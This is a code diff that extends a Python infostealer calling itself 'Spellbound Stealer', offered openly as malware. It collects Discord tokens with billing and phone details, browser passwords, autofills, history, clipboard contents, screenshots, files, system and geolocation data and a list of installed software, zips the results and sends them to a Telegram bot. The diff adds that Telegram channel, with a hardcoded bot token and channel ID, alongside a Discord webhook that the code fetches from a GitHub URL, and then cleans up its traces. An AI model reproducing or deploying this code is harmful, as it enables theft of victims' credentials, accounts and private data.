@@ -1,12 +1,13 @@
 CONFIG = {
+    "C2": "telegram",
     "discord": True,
-    "passwords": True,
-    "autofills": True,
-    "history": True,
+    "chromium": True,
+    "system-infos": True,
     "screenshot": True,
     "file-stealer": True,
-    "anti-spam": False,
     "clipboard": True,
+    "installed-softwares": True,
+    "installed-browsers": True,
     "auto-delete": False
 }
 
@@ -16,6 +17,7 @@ import sys
 import time
 import json
 import uuid
+import winreg
 import ctypes
 import base64
 import shutil
@@ -40,7 +42,8 @@ CONTAINER_FOLDER_PATH = f"C:\\Users\\{os.getlogin()}\\My Games"
 ZIP_PATH = f"{CONTAINER_FOLDER_PATH}\\{os.getlogin()}.zip"
 DISCORD_FOLDER_PATH = f"{CONTAINER_FOLDER_PATH}\\Discord"
 CHROMIUM_FOLDER_PATH = f"{CONTAINER_FOLDER_PATH}\\Chromium Browsers"
-FILES_FOLDER_PATH = f"{CONTAINER_FOLDER_PATH}\\Files"
+FILES_FOLDER_PATH = f"{CONTAINER_FOLDER_PATH}\\Common Files"
+SOFTWARE_FOLDER_PATH = f"{CONTAINER_FOLDER_PATH}\\Softwares"
 
 if not os.path.exists(CONTAINER_FOLDER_PATH):
     os.mkdir(CONTAINER_FOLDER_PATH)
@@ -50,6 +53,8 @@ if not os.path.exists(CHROMIUM_FOLDER_PATH):
     os.mkdir(CHROMIUM_FOLDER_PATH)
 if not os.path.exists(FILES_FOLDER_PATH):
     os.mkdir(FILES_FOLDER_PATH)
+if not os.path.exists(SOFTWARE_FOLDER_PATH):
+    os.mkdir(SOFTWARE_FOLDER_PATH)
 with open(f"{CONTAINER_FOLDER_PATH}\\.execution logs.txt", "w") as writer:
     pass
 
@@ -145,6 +150,7 @@ def AutoDelete():
 discordRegexp = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
 discordRegexpEnc = r"dQw4w9WgXcQ:[^\"]*"
 __DISCORD_TOKENS__ = []
+__USER_EMAILS__ = []
 discordUIDS = []
 discordCommonPaths = {'Discord': ROAMING + '\\discord\\Local Storage\\leveldb\\','Discord Canary': ROAMING + '\\discordcanary\\Local Storage\\leveldb\\','Lightcord': ROAMING + '\\Lightcord\\Local Storage\\leveldb\\','Discord PTB': ROAMING + '\\discordptb\\Local Storage\\leveldb\\','Opera': ROAMING + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\','Opera GX': ROAMING + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\','Amigo': LOCALAPPDATA + '\\Amigo\\User Data\\Local Storage\\leveldb\\','Torch': LOCALAPPDATA + '\\Torch\\User Data\\Local Storage\\leveldb\\','Kometa': LOCALAPPDATA + '\\Kometa\\User Data\\Local Storage\\leveldb\\','Orbitum': LOCALAPPDATA + '\\Orbitum\\User Data\\Local Storage\\leveldb\\','CentBrowser': LOCALAPPDATA + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\','7Star': LOCALAPPDATA + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\','Sputnik': LOCALAPPDATA + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\','Vivaldi': LOCALAPPDATA + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\','Chrome SxS': LOCALAPPDATA + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\','Chrome': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\','Chrome1': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\','Chrome2': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\','Chrome3': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\','Chrome4': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\','Chrome5': LOCALAPPDATA + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\','Epic Privacy Browser': LOCALAPPDATA + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\','Microsoft Edge': LOCALAPPDATA + '\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\','Uran': LOCALAPPDATA + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\','Yandex': LOCALAPPDATA + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\','Brave': LOCALAPPDATA + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\','Iridium': LOCALAPPDATA + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
 totalDiscordTokens = 0
@@ -226,14 +232,17 @@ def ExtractInfosFromToken():
             payment_methods = None
 
         final_message = (f'Username: {username} ({user_id})\n'
-                         f'🔑Token: {token}\n'
+                         f'Token: {token}\n'
                          f'Nitro: {nitro}\n'
-                         f'💳Billing: {payment_methods if payment_methods != "" else "None"}\n'
-                         f'🔒MFA: {mfa}'
+                         f'Billing: {payment_methods if payment_methods != "" else "None"}\n'
+                         f'MFA: {mfa}'
                          f'Email: {email if email != None else "None"}\n'
-                         f'📱Phone: {phone if phone != None else "None"}\n'
+                         f'Phone: {phone if phone != None else "None"}\n'
                          f'==============\n')
         final_to_return.append(final_message)
+
+        if email != None:
+            __USER_EMAILS__.append(email)
 
     return final_to_return
 
@@ -277,6 +286,8 @@ if CONFIG["discord"]:
             for token in tokens:
                 writer.write(token)
                 totalDiscordTokens += 1
+
+        log.info(f"Discord Token saved")
     except Exception as e:
         log.error(f"Unexpected error - Discord : {e}")
 
@@ -445,7 +456,7 @@ def ChromiumGetHistory():
             history_entry = f"Url: {row[0]}\nTitle: {row[1]}\n==============\n"
             __CHROMIUM_HISTORY__.append(history_entry)
 
-if CONFIG["passwords"]:
+if CONFIG["chromium"]:
     try:
         ChromiumGetPassword()
 
@@ -461,10 +472,11 @@ if CONFIG["passwords"]:
             with open(f"{CHROMIUM_FOLDER_PATH}\\.passwords.txt", "w", encoding="utf-8") as writer:
                 writer.write(FILE_HEADER)
                 writer.write(formatted)
+
+        log.info(f"Passwords saved")
     except Exception as e:
         log.error(f"Unexpected error - Chromium - Passwords : {e}")
 
-if CONFIG["autofills"]:
     try:
         ChromiumGetAutofill()
 
@@ -473,10 +485,11 @@ if CONFIG["autofills"]:
             for autofill in __CHROMIUM_AUTOFILLS__:
                 writer.write(autofill)
                 totalAutofills += 1
+
+        log.info(f"Autofills saved")
     except Exception as e:
         log.error(f"Unexpected error - Chromium - Autofills : {e}")
 
-if CONFIG["history"]:
     try:
         ChromiumGetHistory()
 
@@ -485,6 +498,8 @@ if CONFIG["history"]:
             for entry in __CHROMIUM_HISTORY__:
                 writer.write(entry)
                 totalHistory += 1
+
+        log.info(f"History saved")
     except Exception as e:
         log.error(f"Unexpected error - Chromium - History : {e}")
 
@@ -497,6 +512,8 @@ if CONFIG["clipboard"]:
             with open(f"{CONTAINER_FOLDER_PATH}\\.clipboard.txt", "w", encoding="utf-8") as writer:
                 writer.write(FILE_HEADER)
                 writer.write(subprocess.run("powershell Get-Clipboard", shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.decode(errors="ignore").strip())
+            
+            log.info(f"Clipboard saved")
     except Exception as e:
         log.error(f"Unexpected error - Clipboard : {e}")
 
@@ -539,6 +556,7 @@ if CONFIG["screenshot"]:
         user32.ReleaseDC(0, hdc_screen)
         image = Image.frombuffer("RGB", (screen_width, screen_height), buffer, "raw", "BGRX", 0, 1)
         image.save(f"{CONTAINER_FOLDER_PATH}\\.desktop.png")
+        log.info(f"Screenshot saved")
         totalFiles += 1
     except Exception as e:
         log.error(f"The screenshot encountered an error : {e}")
@@ -557,6 +575,7 @@ if CONFIG["file-stealer"]:
     for file in filesToSteal:
         destination = f"{FILES_FOLDER_PATH}\\{os.path.basename(file)}"
         shutil.copy(file, destination)
+        log.info(f"{file} added to the zip")
         totalFiles += 1
 
 
@@ -567,7 +586,7 @@ data = requInfos.json()
 
 session = os.getlogin()
 computer_name = socket.gethostname()
-osVersion = platform.system() + " " + platform.release()
+os_version = platform.system() + " " + platform.release()
 architecture = platform.machine()
 mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
 ip = data.get('ip')
@@ -576,7 +595,61 @@ region = data.get('region')
 city = data.get('city')
 loc = data.get('loc')
 org = data.get('org')
+cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip().split('\n')[2]
 
+if CONFIG["system-infos"]:
+    with open(f"{CONTAINER_FOLDER_PATH}\\.computer.txt", "w", encoding="utf-8") as writer:
+        writer.write(FILE_HEADER)
+
+        writer.write(f"""👤 Session Name: {session}
+👥 Computer Name: {computer_name}
+💻 OS: {os_version}
+🛠 Architecture: {architecture}
+📡 MAC: {mac}
+⚙ CPU: {cpu}
+📌 IP: {ip}
+🌍 Country: {country}
+🗺 Region: {region}
+🏠 City: {city}
+🧭 Localisation: {loc}
+⚡ Internet Provider: {org}
+""")
+
+# ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
+# ============================================================================================= INSTALLED SOFTWARES ================================================================================================== #
+if CONFIG["installed-browsers"]:
+    with open(f"{SOFTWARE_FOLDER_PATH}\\.installed-browsers.txt", "w", encoding="utf-8") as writer:
+        writer.write(FILE_HEADER)
+
+        writer.write("=== Installed Browsers ===\n")
+        try:
+            with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Clients\StartMenuInternet") as key:
+                for i in range(winreg.QueryInfoKey(key)[0]):
+                    writer.write(f"{winreg.EnumKey(key, i)}\n")
+        except FileNotFoundError:
+            pass
+
+if CONFIG["installed-softwares"]:
+    with open(f"{SOFTWARE_FOLDER_PATH}\\.installed-softwares.txt", "w", encoding="utf-8") as writer:
+        writer.write(FILE_HEADER)
+
+        key_paths = [r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall", r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"]
+
+        writer.write("=== Installed Softwares ===\n")
+
+        for key_path in key_paths:
+            try:
+                with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
+                    for i in range(winreg.QueryInfoKey(key)[0]):
+                        subkey_name = winreg.EnumKey(key, i)
+                        try:
+                            with winreg.OpenKey(key, subkey_name) as subkey:
+                                name, _ = winreg.QueryValueEx(subkey, "DisplayName")
+                                writer.write(f"{name}\n")
+                        except FileNotFoundError:
+                            continue
+            except FileNotFoundError:
+                    continue
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
 # ============================================================================================= BUILD ZIP ============================================================================================================ #
@@ -584,45 +657,77 @@ with zipfile.ZipFile(ZIP_PATH, "w") as zip_file:
     zip_file.write(f"{CONTAINER_FOLDER_PATH}\\.execution logs.txt", arcname=".execution logs.txt")
     if CONFIG["screenshot"]: zip_file.write(f"{CONTAINER_FOLDER_PATH}\\.desktop.png", arcname=".desktop.png")
     if CONFIG["discord"]: AddFolderToZip(zip_file, DISCORD_FOLDER_PATH, arcBase="Discord")
-    if CONFIG["passwords"] or CONFIG["autofills"] or CONFIG["history"]: AddFolderToZip(zip_file, CHROMIUM_FOLDER_PATH, arcBase="Chromium Browsers")
-    if CONFIG["file-stealer"]: AddFolderToZip(zip_file, FILES_FOLDER_PATH, arcBase="Files")
+    if CONFIG["chromium"]: AddFolderToZip(zip_file, CHROMIUM_FOLDER_PATH, arcBase="Chromium Browsers")
+    if CONFIG["file-stealer"]: AddFolderToZip(zip_file, FILES_FOLDER_PATH, arcBase="Common Files")
+    if CONFIG["installed-browsers"] or CONFIG["installed-softwares"]: AddFolderToZip(zip_file, SOFTWARE_FOLDER_PATH, arcBase="Softwares")
     if CONFIG["clipboard"]: zip_file.write(f"{CONTAINER_FOLDER_PATH}\\.clipboard.txt", arcname=".clipboard.txt")
+    if CONFIG["system-infos"]: zip_file.write(f"{CONTAINER_FOLDER_PATH}\\.computer.txt", arcname=".computer.txt")
 
 
 # ____________________________________________________________________________________________________________________________________________________________________________________________________________________ #
 # ============================================================================================= SEND DATA ============================================================================================================ #
-blue = "[2;45m[0m[2;45m[0m[2;35m"
-purple = "[2;34m"
-reset = "[0m"
+if CONFIG["C2"] == "discord":
+    blue = "[2;45m[0m[2;45m[0m[2;35m"
+    purple = "[2;34m"
+    reset = "[0m"
 
-embed = {
-    "title": "Spellbound Stealer",
-    "color": 0,
-    "fields": [
-        {"name": ":computer: __System Infos__", "value": f"```ansi\n{blue}Session{reset} : {session}\n{blue}Computer Name{reset} : {computer_name}\n{blue}OS{reset} : {osVersion}\n{blue}Architecture{reset} : {architecture}\n{blue}MAC{reset} : {mac}\n{blue}CPU{reset} : {subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW).stdout.strip().split('\n')[2]}\n{blue}IP{reset} : {ip}\n{blue}Country{reset} : {country}\n{blue}Region{reset} : {region}\n{blue}City{reset} : {city}\n{blue}Localisation{reset} : {loc}\n{blue}Internet Provider{reset} : {org}```", "inline": False},
-        {"name": ":identification_card: __User Infos__", "value": f"```ansi\n{purple}Discord Account{reset} : {totalDiscordTokens}\n{purple}Passwords{reset} : {totalPasswords}\n{purple}Auto-fills{reset} : {totalAutofills}\n{purple}History{reset} : {totalHistory}\n{purple}Stolen Files{reset} : {totalFiles}```", "inline": False},
-    ],
-    "footer": {"text": "Grabbed by Spellbound"}
-}
-payload = {"embeds": [embed]}
+    embed = {
+        "title": "Spellbound Stealer",
+        "color": 0,
+        "fields": [
+            {"name": ":computer: __System Infos__", "value": f"```ansi\n{blue}Session Name{reset} : {session}\n{blue}Computer Name{reset} : {computer_name}\n{blue}OS{reset} : {os_version}\n{blue}Architecture{reset} : {architecture}\n{blue}MAC{reset} : {mac}\n{blue}CPU{reset} : {cpu}\n{blue}IP{reset} : {ip}\n{blue}Country{reset} : {country}\n{blue}Region{reset} : {region}\n{blue}City{reset} : {city}\n{blue}Localisation{reset} : {loc}\n{blue}Internet Provider{reset} : {org}```", "inline": False},
+            {"name": ":identification_card: __Available Infos__", "value": f"```ansi\n{purple}Discord Account{reset} : {totalDiscordTokens}\n{purple}Passwords{reset} : {totalPasswords}\n{purple}Auto-fills{reset} : {totalAutofills}\n{purple}History{reset} : {totalHistory}\n{purple}Stolen Files{reset} : {totalFiles}```", "inline": False},
+        ],
+        "footer": {"text": "Grabbed by Spellbound"}
+    }
+    payload = {"embeds": [embed]}
 
-with open(ZIP_PATH, "rb") as zipFileToSend:
-    fileReady = {"file": zipFileToSend}
-    try:
-        req = requests.get("https://raw.githubusercontent.com/JuanaCOrtiz/test-rep/main/snake.txt")
-        log.info("Webhook is OK")
-        res = requests.post(req.text.strip(), files=fileReady, data={"payload_json": json.dumps(payload)})
-        log.info("Data sent")
-    except Exception as e:
-        log.error(f"Webhook error : {e}")
+    with open(ZIP_PATH, "rb") as zipFileToSend:
+        fileReady = {"file": zipFileToSend}
+        try:
+            req = requests.get("https://raw.githubusercontent.com/JuanaCOrtiz/test-rep/main/snake.txt")
+            log.info("Webhook extracted")
+            res = requests.post(req.text.strip(), files=fileReady, data={"payload_json": json.dumps(payload)})
+            log.info("Data succesfully sent")
+        except Exception as e:
+            log.error(f"Webhook error : {e}")
+
+elif CONFIG["C2"] == "telegram":
+    TOKEN = "7931282619:AAEW3bNWCj3Pjj6n-SHew1fSgryTtjtBRr4"
+    CHANNEL_ID = "-1002458809139"
+
+    MESSAGE = f"""
+<u><b>System Infos :</b></u>
+    👤 Session Name: {session}
+    👥 Computer Name: {computer_name}
+    💻 OS: {os_version}
+    🛠 Architecture: {architecture}
+    📡 MAC: {mac}
+    📌 IP: {ip}
+    🌍 Country: {country}
+
+<u><b>Available Infos :</b></u>
+    🔵 Discord Account: {totalDiscordTokens}
+    ⌨ Passwords: {totalPasswords}
+    📑 Auto-fills: {totalAutofills}
+    🗂 History: {totalHistory}
+    🗃 Stolen Files: {totalFiles}"""
+
+    url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
+    with open(ZIP_PATH, "rb") as file:
+        files = {"document": file}
+        data = {"chat_id": CHANNEL_ID, "caption": MESSAGE, "parse_mode": "HTML"}
+        res = requests.post(url, data=data, files=files)
 
 SafeRemove(ZIP_PATH)
 SafeRemove(f"{CONTAINER_FOLDER_PATH}\\.desktop.png")
-SafeRemove(f"{CONTAINER_FOLDER_PATH}\\.execution logs.txt")
 SafeRemove(f"{CONTAINER_FOLDER_PATH}\\.clipboard.txt")
+SafeRemove(f"{CONTAINER_FOLDER_PATH}\\.computer.txt")
 shutil.rmtree(DISCORD_FOLDER_PATH)
+shutil.rmtree(SOFTWARE_FOLDER_PATH)
 shutil.rmtree(CHROMIUM_FOLDER_PATH)
 shutil.rmtree(FILES_FOLDER_PATH)
+SafeRemove(f"{CONTAINER_FOLDER_PATH}\\.execution logs.txt")
 
 if CONFIG["auto-delete"]:
     if not "Spellbound" in __file__ or not "Developements" in __file__:
